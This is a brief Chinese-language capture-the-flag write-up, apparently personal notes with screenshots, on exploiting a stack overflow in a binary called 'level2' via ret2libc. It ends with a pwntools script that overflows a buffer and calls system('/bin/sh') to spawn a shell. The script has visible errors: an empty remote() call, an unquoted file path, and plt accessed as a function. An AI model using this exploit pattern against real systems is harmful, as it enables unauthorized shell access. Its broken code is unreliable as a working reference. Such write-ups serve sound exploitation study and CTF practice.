前面的流程我们可以先省略，我们用我们的 IDA 打开我们的文件
![[Pasted image 20231204220454.png]]
我们的 `system` 出现，意味着我们可以使用我们的一个 `ret2libc` 的漏洞
![[Pasted image 20231204220521.png]]
并且我们这里有一个我们的 `read` 漏洞，我们的思路就是运用我们的 `ret2libc` 了。

我们的第一步：查看我们溢出的距离：

![[Pasted image 20231204220711.png]]

第二步：找到我们函数中出现的 `/bin/sh`
![[Pasted image 20231204220852.png]]
第三步：我们构建我们的语句：
```python
from pwn import *
io=remote()
io.recv()
elf=ELF(./level2)
system_plt=elf.plt("system")
bin_sh=next(elf.search(b"/bin/sh"))
payload=cyclic(0x88+0x4)+p32(system_plt)+p32(0xdeadbeef)+p32(bin_sh)
io.sendline(payload)
io.interactive()
```